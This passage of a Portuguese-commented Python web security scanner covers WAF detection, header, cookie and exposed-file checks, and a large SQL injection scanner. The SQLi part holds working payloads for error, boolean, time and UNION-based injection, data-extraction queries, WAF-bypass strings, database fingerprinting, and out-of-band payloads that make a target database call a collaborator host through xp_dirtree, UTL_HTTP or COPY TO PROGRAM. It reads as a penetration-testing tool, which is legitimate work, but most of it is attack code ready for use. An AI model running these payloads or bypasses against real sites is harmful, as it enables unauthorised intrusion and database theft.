        # 2. Verifica por cookies
        for waf, sig in waf_signatures.items():
            if "cookie" in sig and sig["cookie"] in waf_response.cookies:
                console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]{waf}[/yellow] (por cookie)")
                return

        # 3. Verifica por conteúdo na página
        for waf, sig in waf_signatures.items():
            if "body" in sig and sig["body"].lower() in waf_response.text.lower():
                console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]{waf}[/yellow] (pelo conteúdo da página)")
                return

        # 4. Verifica por status code de bloqueio
        if waf_response.status_code in [403, 406, 429] and normal_response.status_code == 200:
            console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]WAF Genérico[/yellow] (Status Code: {waf_response.status_code})")
            return

        console.print("[bold yellow][-] Nenhum WAF conhecido foi detectado com esta técnica.[/bold yellow]")

    except requests.RequestException as e:
        console.print(f"[bold red][!] Erro ao tentar detectar WAF: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 13: VERIFICADOR DE VULNERABILIDADES BÁSICAS (MELHORADO) ---

class VulnerabilityScanner:
    """Classe para organizar a verificação de vulnerabilidades."""
    
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.findings = []
        self.response = None
        self.detected_techs = []

    def _get_initial_response(self):
        try:
            self.response = requests.get(self.url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=True, verify=False)
            self.url = self.response.url
            return True
        except requests.RequestException as e:
            console.print(f"[bold red][!] Não foi possível obter a página inicial: {e}[/bold red]")
            return False

    def _add_finding(self, risk, v_type, detail, recommendation):
        self.findings.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})

    def _check_security_headers(self):
        headers = self.response.headers
        security_headers_map = {
            "Content-Security-Policy": ("Médio", "Implementar CSP para prevenir ataques de XSS e injeção de dados."),
            "X-Frame-Options": ("Médio", "Usar 'X-Frame-Options: DENY' ou 'SAMEORIGIN' para prevenir Clickjacking."),
            "Strict-Transport-Security": ("Médio", "Implementar HSTS para forçar conexões HTTPS."),
            "Referrer-Policy": ("Baixo", "Definir 'Referrer-Policy: strict-origin-when-cross-origin' ou mais restritiva."),
            "Permissions-Policy": ("Baixo", "Definir uma política de permissões para limitar o acesso a APIs do navegador.")
        }
        for header, (risk, rec) in security_headers_map.items():
            if header not in headers:
                self._add_finding(risk, "Má Configuração de Segurança", f"Cabeçalho '{header}' ausente.", rec)

    def _check_insecure_cookies(self):
        for cookie in self.response.cookies:
            if not cookie.secure and urlparse(self.url).scheme == 'https':
                self._add_finding("Baixo", "Cookie Inseguro", f"O cookie '{cookie.name}' não possui a flag 'Secure'.", "Adicionar a flag 'Secure' a todos os cookies em sites HTTPS.")
            if not getattr(cookie, 'has_nonstandard_attr', lambda _: False)('httponly') and not getattr(cookie, '_rest', {}).get('httponly', False) and cookie.name.lower() not in ['_ga']:
                self._add_finding("Baixo", "Cookie Inseguro", f"O cookie '{cookie.name}' não possui a flag 'HttpOnly'.", "Adicionar a flag 'HttpOnly' para prevenir acesso via JavaScript.")
    
    def _check_info_disclosure(self):
        server_version = self.response.headers.get('Server', '')
        if server_version:
            self._add_finding("Baixo", "Exposição de Informação", f"O servidor expõe sua versão: {server_version}", "Ocultar ou alterar o banner do servidor para evitar a enumeração de versões.")
        
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', self.response.text))
        if emails:
            self._add_finding("Baixo", "Exposição de Informação", f"E-mails encontrados: {', '.join(emails)}", "Remover ou ofuscar endereços de e-mail de páginas públicas.")

    def _analyze_robots_txt(self):
        robots_url = urljoin(self.url, '/robots.txt')
        try:
            res = requests.get(robots_url, timeout=5, verify=False)
            if res.ok:
                disallowed_paths = re.findall(r'Disallow:\s*(.*)', res.text)
                if disallowed_paths:
                    paths = "\n".join([p.strip() for p in disallowed_paths])
                    self._add_finding("Baixo", "Exposição de Informação", f"Caminhos sensíveis encontrados no robots.txt:\n{paths}", "Verificar se os caminhos 'Disallow' não são acessíveis publicamente.")
        except requests.RequestException: pass

    def _check_sensitive_files(self):
        sensitive_files = {
            ".env": "Contém credenciais de ambiente, chaves de API.", ".git/config": "Expõe o URL do repositório de código-fonte.",
            "docker-compose.yml": "Revela a infraestrutura e configuração de serviços.", "database.yml": "Ficheiro de configuração de base de dados (comum em Rails).",
            "wp-config.php.bak": "Backup de configuração do WordPress com credenciais de BD.", "local.xml": "Configuração do Magento com credenciais de BD.",
            "backup.sql": "Backup de base de dados, pode conter dados sensíveis.",
        }
        found_files = discover_directories(self.url, list(sensitive_files.keys()), workers=20, internal_call=True)
        for file_url, status, _ in found_files:
            if status == 200:
                filename = file_url.split('/')[-1]
                reason = sensitive_files.get(filename, "Ficheiro de configuração ou backup.")
                self._add_finding("Alto", "Exposição de Ficheiro Sensível", f"Ficheiro encontrado: {file_url}", f"Remover o ficheiro imediatamente do acesso público. {reason}")

    def _run_tech_specific_checks(self):
        if any('wordpress' in t.lower() for t in self.detected_techs):
            xmlrpc_url = urljoin(self.url, 'xmlrpc.php')
            try:
                res = requests.get(xmlrpc_url, timeout=5, verify=False)
                if res.status_code == 200 or res.status_code == 405:
                     self._add_finding("Médio", "Má Configuração (WordPress)", "O ficheiro xmlrpc.php está ativo.", "Desativar o xmlrpc.php se não for usado para prevenir ataques de força bruta e DDoS.")
            except requests.RequestException: pass

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando verificação de vulnerabilidades em: [bold cyan]{self.url}[/bold cyan]")
            console.print("-" * 60)
        
        with console.status("[bold green]Analisando configurações de segurança...[/bold green]", spinner="dots"):
            if not self._get_initial_response():
                return [] if return_findings else None

            tech_findings = detect_technologies(self.url, return_findings=True)
            if tech_findings:
                self.detected_techs = [tech for sublist in tech_findings.values() for tech in sublist]
            
            self._check_security_headers()
            self._check_insecure_cookies()
            self._check_info_disclosure()
            self._analyze_robots_txt()
            self._check_sensitive_files()
            if self.detected_techs:
                self._run_tech_specific_checks()
        
        if return_findings: return self.findings
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.findings:
            console.print("[bold green][+] Nenhuma vulnerabilidade de baixo risco foi encontrada.[/bold green]")
        else:
            table = Table(title=f"Relatório de Vulnerabilidades Encontradas em {self.url}")
            table.add_column("Risco", justify="center")
            table.add_column("Tipo de Vulnerabilidade", style="cyan")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")

            risk_order = {"Alto": 0, "Médio": 1, "Baixo": 2}
            sorted_findings = sorted(self.findings, key=lambda x: risk_order[x["Risco"]])
            risk_counts = Counter(f['Risco'] for f in sorted_findings)

            for f in sorted_findings:
                risk_style = "red" if f['Risco'] == 'Alto' else "yellow" if f['Risco'] == 'Médio' else "green"
                table.add_row(f"[{risk_style}]{f['Risco']}[/{risk_style}]", f['Tipo'], f['Detalhe'], f['Recomendação'])
            
            console.print(table)
            
            summary_parts = []
            if risk_counts['Alto'] > 0: summary_parts.append(f"[red]{risk_counts['Alto']} Risco(s) Alto(s)[/red]")
            if risk_counts['Médio'] > 0: summary_parts.append(f"[yellow]{risk_counts['Médio']} Risco(s) Médio(s)[/yellow]")
            if risk_counts['Baixo'] > 0: summary_parts.append(f"[green]{risk_counts['Baixo']} Risco(s) Baixo(s)[/green]")
            
            console.print(f"\n[bold]Resumo dos Riscos:[/bold] {', '.join(summary_parts)} encontrados.")
        console.print("-" * 60)

def vuln_scan(url):
    VulnerabilityScanner(url).run_scan()

import random
import string
# --- MÓDULO 14: SCANNER DE SQL INJECTION MELHORADO ---

class SQLiScanner:
    """Classe para realizar scans de SQL Injection com múltiplos níveis e técnicas."""

    def __init__(self, base_url, level=1, dbms=None, collaborator_url=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        self.vulnerable_points = []
        self.level = level
        self.dbms = dbms.lower() if dbms else None
        self.collaborator_url = collaborator_url
        self.waf_detected = None
        self.db_fingerprint = None
        self.confirmed_vulns = []
        self.statistics = {
            'total_tests': 0,
            'vulnerabilities_found': 0,
            'false_positives_filtered': 0,
            'waf_bypasses': 0,
            'confirmed_vulns': 0,
            'oast_payloads_sent': 0
        }
        
        # Assinaturas de WAF/IPS
        self.waf_signatures = {
            'cloudflare': {
                'headers': [r'cf-ray', r'cloudflare', r'__cfduid'],
                'content': [r'cloudflare', r'attention required', r'checking your browser'],
                'status_codes': [403, 503]
            },
            'akamai': {
                'headers': [r'akamai', r'ghost'],
                'content': [r'reference.*18\\..*\\.\\d+\\.\\d+'],
                'status_codes': [403]
            },
            'aws_waf': {
                'headers': [r'awselb', r'x-amzn'],
                'content': [r'aws', r'request blocked'],
                'status_codes': [403]
            },
            'mod_security': {
                'headers': [r'mod_security', r'modsecurity'],
                'content': [r'mod_security', r'not acceptable', r'reference id'],
                'status_codes': [403, 406]
            },
            'imperva': {
                'headers': [r'x-iinfo'],
                'content': [r'imperva', r'incapsula'],
                'status_codes': [403]
            }
        }
        
        # Payloads estruturados por tipo para serem ativados por nível
        self.payloads = {
            "error_based": {
                "basic": ["'", "\"", "')", ";'", ";", "' AND 'x'='y"],
                "intermediate": [
                    "' /*!50000AND*/ 'x'='y",
                    "'%20AND%201=0",
                    "' AND 1=IF(1,0,1)"
                ],
                "advanced": [
                    "' OR '(SELECT 1 FROM (SELECT SLEEP(1))A)'",
                    "' AND (SELECT * FROM (SELECT(SLEEP(1)))a)",
                    "' `(SELECT 1 FROM (SELECT SLEEP(1))A)` '"
                ]
            },
            "boolean_based": {
                "true": {
                    "basic": ["' OR '1'='1", " OR 1=1", "' OR 1=1--", " OR 1=1--", "' OR 1=1#", " OR 1=1#"],
                    "intermediate": [
                        "' /*!50000OR*/ 1=1",
                        "' OR 1 IN (1)",
                        "' OR 'a'='a'"
                    ],
                    "advanced": [
                        "' OR 1=1 AND 'a'='a'",
                        "' OR 1=1 AND 'a' LIKE 'a'",
                        "' OR 1=1 AND 'a' RLIKE 'a'"
                    ]
                },
                "false": {
                    "basic": ["' AND '1'='2", " AND 1=2", "' AND 1=2--", " AND 1=2--", "' AND 1=2#", " AND 1=2#"],
                    "intermediate": [
                        "' /*!50000AND*/ 1=2",
                        "' AND 1 IN (2)",
                        "' AND 'a'='b'"
                    ],
                    "advanced": [
                        "' AND 1=2 AND 'a'='a'",
                        "' AND 1=2 AND 'a' LIKE 'a'",
                        "' AND 1=2 AND 'a' RLIKE 'a'"
                    ]
                }
            },
            "time_based": {
                "mysql": {
                    "basic": "' AND SLEEP(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ SLEEP(5)--",
                    "advanced": "' /*!50000AND*/ SLEEP(5)--"
                },
                "postgresql": {
                    "basic": "' AND pg_sleep(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ pg_sleep(5)--",
                    "advanced": "' AND (SELECT pg_sleep(5))--"
                },
                "mssql": {
                    "basic": "' WAITFOR DELAY '0:0:5'--",
                    "evasive": "' /*comment*/ WAITFOR /*comment*/ DELAY '0:0:5'--",
                    "advanced": ";WAITFOR DELAY '0:0:5'--"
                },
                "oracle": {
                    "basic": "' AND DBMS_LOCK.SLEEP(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ DBMS_LOCK.SLEEP(5)--",
                    "advanced": "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)--"
                },
                "sqlite": {
                    "basic": "' AND LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                    "evasive": "' /*comment*/ AND /*comment*/ LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                    "advanced": "' AND (SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2)))))--"
                }
            },
            "union_based": {
                "detection": ["' UNION SELECT NULL--", "' UNION ALL SELECT NULL--", "'+UNION+SELECT+NULL--"],
                "column_enum": [
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
                ],
                "data_extraction": [
                    "' UNION SELECT database(),user()--",
                    "' UNION SELECT version(),@@version_comment--",
                    "' UNION SELECT table_name,column_name FROM information_schema.columns--"
                ]
            },
            "oast_based": {
                "mssql": [
                    "'; EXEC master..xp_dirtree '//{payload_id}.{collaborator_host}/a'--",
                    "'; DECLARE @q VARCHAR(99); SET @q = '//{payload_id}.{collaborator_host}/a'; EXEC master..xp_fileexist @q--"
                ],
                "oracle": [
                    "' AND UTL_HTTP.REQUEST('http://{payload_id}.{collaborator_host}/a') IS NOT NULL--",
                    "' AND UTL_INADDR.GET_HOST_ADDRESS('{payload_id}.{collaborator_host}') IS NOT NULL--"
                ],
                "postgresql": [
                    "'; COPY (SELECT '') TO PROGRAM 'nslookup {payload_id}.{collaborator_host}'--"
                ]
            }
        }
        self.error_patterns = {
            "mysql": r"you have an error in your sql syntax|warning: mysql|unknown column|illegal mix of collations",
            "postgresql": r"postgres[ql]? error|unterminated quoted string|syntax error at or near",
            "mssql": r"unclosed quotation mark|incorrect syntax near|conversion failed when converting",
            "oracle": r"ora-[0-9][0-9][0-9][0-9]|quoted string not properly terminated",
            "sqlite": r"sqlite error|near \".*?\": syntax error"
        }

    def _get_page_content(self, url, method='get', data=None, headers=None, timeout=7):
        """Obtém o conteúdo de uma página e o tempo de resposta, com suporte a headers customizados."""
        final_headers = self.session.headers.copy()
        if headers:
            final_headers.update(headers)
        try:
            start_time = time.time()
            if method.lower() == 'get':
                response = self.session.get(url, params=data, headers=final_headers, timeout=timeout, verify=False)
            else:
                response = self.session.post(url, data=data, headers=final_headers, timeout=timeout, verify=False)
            duration = time.time() - start_time
            return response.text, duration, response
        except requests.exceptions.RequestException:
            return None, 0, None

    def _execute_test_payload(self, url, param, payload, original_value, method, form_data, timeout=7):
        """Executa um único payload de teste, tratando parâmetros e cabeçalhos."""
        test_value = (original_value or "") + payload
        
        req_kwargs = {'url': url, 'timeout': timeout}
        if method == 'header_get':
            req_kwargs['method'] = 'get'
            req_kwargs['headers'] = {param: test_value}
        else:
            req_kwargs['method'] = method
            req_kwargs['data'] = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            
        return self._get_page_content(**req_kwargs)

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona uma nova descoberta, evitando duplicados."""
        console.print(f"[bold red][VULNERABLE][/bold red] {v_type} detectada. Detalhes: {detail}")
        finding = {"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation}
        if finding not in self.vulnerable_points: 
            self.vulnerable_points.append(finding)
            self.statistics['vulnerabilities_found'] += 1
    
    def _detect_waf(self, response):
        """Detecta presença de WAF baseado em headers, conteúdo e status codes."""
        if not response:
            return None
            
        response_headers = ' '.join([f'{k}: {v}' for k, v in response.headers.items()]).lower()
        response_content = response.text.lower()
        status_code = response.status_code
        
        for waf_name, signatures in self.waf_signatures.items():
            # Verifica headers
            for header_pattern in signatures['headers']:
                if re.search(header_pattern, response_headers, re.IGNORECASE):
                    return waf_name
            
            # Verifica conteúdo
            for content_pattern in signatures['content']:
                if re.search(content_pattern, response_content, re.IGNORECASE):
                    return waf_name
            
            # Verifica status codes
            if status_code in signatures['status_codes']:
                # Confirma com padrões de conteúdo se disponível
                if signatures['content'] and any(re.search(pattern, response_content, re.IGNORECASE) 
                                               for pattern in signatures['content']):
                    return waf_name
        
        return None
    
    def _test_waf_bypass(self, url, param, original_value, method, form_data=None):
        """Testa técnicas de bypass de WAF."""
        bypass_techniques = [
            "' /*comment*/ OR /*comment*/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' %0aOR%0a '1'='1",
            "'+OR+ASCII(SUBSTR((SELECT+database()),1,1))>0--",
            "'/**/OR/**/'1'='1",
            "' OR 'x'='x' AND 'y'='y"
        ]
        
        for technique in bypass_techniques:
            test_value = (original_value or "") + technique
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=data, timeout=7, verify=False)
                else:
                    response = self.session.post(url, data=data, timeout=7, verify=False)
                
                # Se não há bloqueio (status 200), é um possível bypass
                if response.status_code == 200:
                    waf = self._detect_waf(response)
                    if not waf:  # WAF não detectado = possível bypass
                        self.statistics['waf_bypasses'] += 1
                        return technique, response
                        
            except requests.exceptions.RequestException:
                continue
        
        return None, None
    
    def _confirm_vulnerability(self, url, param, original_value, method, form_data, payload_type, payload):
        """Confirma vulnerabilidade com múltiplos testes."""
        confirmations = 0
        tests = 3
        
        for _ in range(tests):
            test_value = (original_value or "") + payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, duration, _ = self._get_page_content(url, method=method, data=data)
            
            if content:
                if payload_type == "error_based":
                    for _, pattern in self.error_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            confirmations += 1
                            break
                elif payload_type == "time_based":
                    if duration > 4.5:
                        confirmations += 1
                # Adicionar outras confirmações conforme necessário
        
        # Considera confirmado se 2 de 3 testes passarem
        if confirmations >= 2:
            self.statistics['confirmed_vulns'] += 1
            return True
        else:
            self.statistics['false_positives_filtered'] += 1
            return False
    
    def _fingerprint_database(self, url, param, original_value, method, form_data=None):
        """Tenta identificar o tipo de banco de dados."""
        fingerprint_tests = {
            'mysql': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            'postgresql': "' AND (SELECT COUNT(*) FROM pg_tables)>0--", 
            'mssql': "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
            'oracle': "' AND (SELECT COUNT(*) FROM all_tables)>0--",
            'sqlite': "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
        }
        
        for db_type, test_payload in fingerprint_tests.items():
            test_value = (original_value or "") + test_payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, _, _ = self._get_page_content(url, method=method, data=data)
            
            if content and not any(re.search(pattern, content, re.IGNORECASE) 
                                 for pattern in self.error_patterns.values()):
                return db_type
        
        return None
    
    def _test_union_based(self, url, param, original_value, method, form_data=None):
        """Testa injeção UNION-based, identificando colunas de texto para extração precisa."""
        console.print(f"  [cyan][INFO][/cyan] Testando UNION-based no parâmetro [bold]{param}[/bold]")
        
        # 1. Detectar o número de colunas
        columns_detected = 0
        for col_count in range(1, 15): # Aumentado para 15 colunas
            payload = f"' UNION SELECT {', '.join(['NULL'] * col_count)}-- "
            content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
            if content and not any(re.search(p, content, re.IGNORECASE) for p in self.error_patterns.values()):
                console.print(f"    [green]Detectado {col_count} colunas.[/green]")
                columns_detected = col_count
                break

        if not columns_detected:
            return False

        # 2. Identificar quais colunas aceitam texto
        magic_string = "GeminiTest"
        text_columns = []
        for i in range(columns_detected):
            nulls = ['NULL'] * columns_detected
            nulls[i] = f"'{magic_string}'"
            payload = f"' UNION SELECT {', '.join(nulls)}-- "
            content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
            if content and magic_string in content:
                text_columns.append(i)
        
        if not text_columns:
            console.print("    [yellow]Nenhuma coluna de texto encontrada para extração.[/yellow]")
            # Ainda assim, é uma vulnerabilidade, pois o UNION foi bem-sucedido
            self._add_finding("Médio", "SQL Injection (UNION)", 
                            f"Parâmetro '{param}' em {url} ({method.upper()})", 
                            f"UNION-based vulnerável com {columns_detected} colunas, mas nenhuma coluna de texto foi identificada para extração.")
            return True

        console.print(f"    [green]Colunas de texto encontradas: {text_columns}[/green]")

        # 3. Extrair dados usando as colunas de texto identificadas
        db_info_payloads = {
            "Version": "version()",
            "User": "user()",
            "Database": "database()"
        }

        for info_name, info_payload in db_info_payloads.items():
            nulls = ['NULL'] * columns_detected
            nulls[text_columns[0]] = info_payload # Usa a primeira coluna de texto encontrada
            payload = f"' UNION SELECT {', '.join(nulls)}-- "
            
            content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
            
            # Tenta extrair a informação refletida
            match = re.search(rf'>([^<]+?){magic_string}([^<]+?)<|{magic_string}([^<]+?)', content)
            extracted_data = ""
            if match:
                # Concatena todos os grupos para formar o dado extraído
                extracted_data = ''.join(filter(None, match.groups()))

            if extracted_data:
                console.print(f"    [bold green]Extraído {info_name}:[/bold green] {extracted_data}")
                self._add_finding("Alto", "SQL Injection (UNION)", 
                                f"Parâmetro '{param}' em {url} ({method.upper()})", 
                                f"Extraído {info_name}: {extracted_data} via UNION-based. Payload: '{payload}'")
                return True # Para após a primeira extração bem-sucedida

        return False

    def _test_param(self, url, param, original_value, method, form_data=None):
        """Testa um único parâmetro ou cabeçalho com base no nível de scan definido."""
        self.statistics['total_tests'] += 1
        injection_point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
        console.print(f"[cyan][INFO][/cyan] Testando {injection_point_type} [bold]{param}[/bold] em {url}")
        
        # Detecção inicial de WAF
        _, _, test_response = self._execute_test_payload(url, param, "'", original_value, method, form_data)
        if test_response:
            detected_waf = self._detect_waf(test_response)
            if detected_waf and not self.waf_detected:
                self.waf_detected = detected_waf
                console.print(f"[bold yellow]⚠️  WAF Detectado: {detected_waf.upper()}[/bold yellow]")
        
        # Fingerprinting do banco
        if not self.db_fingerprint and not self.dbms:
            self.db_fingerprint = self._fingerprint_database(url, param, original_value, method, form_data)
            if self.db_fingerprint:
                console.print(f"[bold cyan]🔍 Banco identificado: {self.db_fingerprint.upper()}[/bold cyan]")
        
        # Execução dos testes por nível
        if self.level >= 1 and self._test_error_based(url, param, original_value, method, form_data): return
        if self.level >= 2 and self._test_boolean_based(url, param, original_value, method, form_data): return
        if self.level >= 3:
            if self._test_time_based(url, param, original_value, method, form_data): return
            if self._test_oast_based(url, param, original_value, method, form_data): return

    def _test_error_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção baseada em erros com escalonamento de payloads."""
        console.print(f"  [cyan][INFO][/cyan] Testando Error-Based (Nível 1)...")
        payload_levels = ['basic']
        if self.waf_detected or self.level > 1: # Escala se WAF ou nível alto
            payload_levels.extend(['intermediate', 'advanced'])

        for level in payload_levels:
            for payload in self.payloads["error_based"][level]:
                content, _, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data)
                if content:
                    db_patterns = {self.dbms: self.error_patterns[self.dbms]} if self.dbms else self.error_patterns
                    for db, pattern in db_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "error_based", payload):
                                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                                detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                                recomm = f"Técnica: Error-Based ({level}). Payload: '{payload}'. BD Provável: {db.capitalize()}"
                                self._add_finding("Alto", "SQL Injection", detail, recomm)
                                return True
        return False

    def _test_boolean_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção booleana cega com escalonamento de payloads."""
        console.print(f"  [cyan][INFO][/cyan] Testando Boolean-Based (Nível 2)...")
        
        if method == 'header_get':
            original_content, _, _ = self._get_page_content(url, headers={param: original_value})
        else:
            original_data = {param: original_value} if method == 'get' else form_data
            original_content, _, _ = self._get_page_content(url, method=method, data=original_data)
        if not original_content: return False

        payload_levels = ['basic']
        if self.waf_detected or self.level > 2:
            payload_levels.extend(['intermediate', 'advanced'])

        for level in payload_levels:
            for true_payload in self.payloads["boolean_based"]["true"][level]:
                true_content, _, _ = self._execute_test_payload(url, param, true_payload, original_value, method, form_data)
                if true_content and SequenceMatcher(None, original_content, true_content).ratio() > 0.95:
                    for false_payload in self.payloads["boolean_based"]["false"][level]:
                        false_content, _, _ = self._execute_test_payload(url, param, false_payload, original_value, method, form_data)
                        if false_content and SequenceMatcher(None, original_content, false_content).ratio() < 0.9:
                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "boolean_based", true_payload):
                                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                                detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                                recomm = f"Técnica: Boolean-Based ({level}). Payload: '{true_payload}'"
                                self._add_finding("Alto", "SQL Injection", detail, recomm)
                                return True
        return False

    def _test_time_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção cega baseada em tempo."""
        console.print(f"  [cyan][INFO][/cyan] Testando Time-Based (Nível 3)...")
        db_to_use = self.dbms or self.db_fingerprint
        databases_to_test = {db_to_use: self.payloads["time_based"][db_to_use]} if db_to_use else self.payloads["time_based"]

        for db, payload_dict in databases_to_test.items():
            payload = payload_dict['basic']
            _, duration, _ = self._execute_test_payload(url, param, payload, original_value, method, form_data, timeout=10)
            if duration > 4.5:
                if self._confirm_vulnerability(url, param, original_value, method, form_data, "time_based", payload):
                    point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                    detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                    recomm = f"Técnica: Time-Based Blind. Payload: '{payload}'. BD Provável: {db.capitalize()}"
                    self._add_finding("Alto", "SQL Injection", detail, recomm)
                    return True
        return False

    def _test_oast_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção Out-of-Band (OAST)."""
        if not self.collaborator_url: return False

        console.print(f"  [cyan][INFO][/cyan] Testando Out-of-Band (Nível 3)...")
        db_to_use = self.dbms or self.db_fingerprint
        databases_to_test = {db_to_use: self.payloads["oast_based"][db_to_use]} if db_to_use else self.payloads["oast_based"]
        
        collaborator_host = urlparse(self.collaborator_url).netloc or self.collaborator_url

        for _, payload_list in databases_to_test.items():
            for payload_template in payload_list:
                payload_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                formatted_payload = payload_template.format(payload_id=payload_id, collaborator_host=collaborator_host)
                
                self._execute_test_payload(url, param, formatted_payload, original_value, method, form_data)
                self.statistics['oast_payloads_sent'] += 1
                
                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                detail = f"{point_type} '{param}' em {url} ({method.upper()})"
                recomm = f"Verifique seu servidor OAST ({collaborator_host}) por interações com ID: {payload_id}"
                self._add_finding("Alto", "SQLi (Potencial OAST)", detail, recomm)
                return True
        return False

    def run_scan(self, return_findings=False):
        """Executa o scan de SQLi, descobrindo pontos de entrada e testando-os."""
        if not return_findings:
            # ... (apresentação da configuração)
            pass
        try:
            with console.status("[bold green]Coletando pontos de entrada (links, formulários e cabeçalhos)...[/bold green]"):
                _, _, response = self._get_page_content(self.base_url, timeout=10)
                if not response: raise requests.RequestException("Não foi possível obter a página inicial.")
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        tasks = []
        # Coleta de links com parâmetros
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param, values in parse_qs(parsed.query).items():
                tasks.append(('get', base, param, values[0], None))
        
        # Coleta de formulários
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            form_data = {i.get('name'): i.get('value', 'test') for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in form_data:
                tasks.append((method, action, param, form_data[param], form_data))

        # Adiciona cabeçalhos HTTP como pontos de entrada
        headers_to_test = {
            'User-Agent': self.session.headers.get('User-Agent', 'Mozilla/5.0'),
            'Referer': self.base_url,
            'Cookie': 'test=test'
        }
        for header, value in headers_to_test.items():
            tasks.append(('header_get', self.base_url, header, value, None))

        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada (parâmetro, formulário ou cabeçalho) encontrado para testar.[/yellow]")
            return [] if return_findings else None
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando SQL Injection...", total=len(tasks))
            for method, url, param, value, form_data in tasks:
                point_type = "Cabeçalho" if method == 'header_get' else "Parâmetro"
                progress.update(task_id, advance=1, description=f"[green]Testando {point_type} [cyan]{param}[/cyan]...")
                self._test_param(url, param, value, method, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        """Apresenta os resultados do scan de SQLi com estatísticas detalhadas."""
        console.print("\n[bold cyan]═══ RESULTADOS DO SCAN ═══[/bold cyan]")
        
        # Estatísticas do scan
        stats_table = Table(title="Estatísticas do Scan", show_header=True, header_style="bold yellow")
        stats_table.add_column("Métrica", style="cyan", width=25)
        stats_table.add_column("Valor", style="yellow", width=15)
        stats_table.add_column("Descrição", style="white", width=30)
        
        stats_table.add_row("Testes Realizados", str(self.statistics['total_tests']), "Total de parâmetros testados")
        stats_table.add_row("Vulnerabilidades", str(self.statistics['vulnerabilities_found']), "SQLi encontradas")
        stats_table.add_row("Confirmadas", str(self.statistics['confirmed_vulns']), "Vulnerabilidades confirmadas")
        stats_table.add_row("Falsos Positivos", str(self.statistics['false_positives_filtered']), "Filtrados pela confirmação")
        
        if self.collaborator_url:
            stats_table.add_row("Payloads OAST Enviados", str(self.statistics['oast_payloads_sent']), "Testes Out-of-Band executados")

        if self.waf_detected:
            stats_table.add_row("WAF Detectado", self.waf_detected.upper(), "Firewall de aplicação web")
            stats_table.add_row("Bypasses WAF", str(self.statistics['waf_bypasses']), "Técnicas que passaram pelo WAF")
        
        if self.db_fingerprint:
            stats_table.add_row("Banco Identificado", self.db_fingerprint.upper(), "Sistema de banco de dados")
        
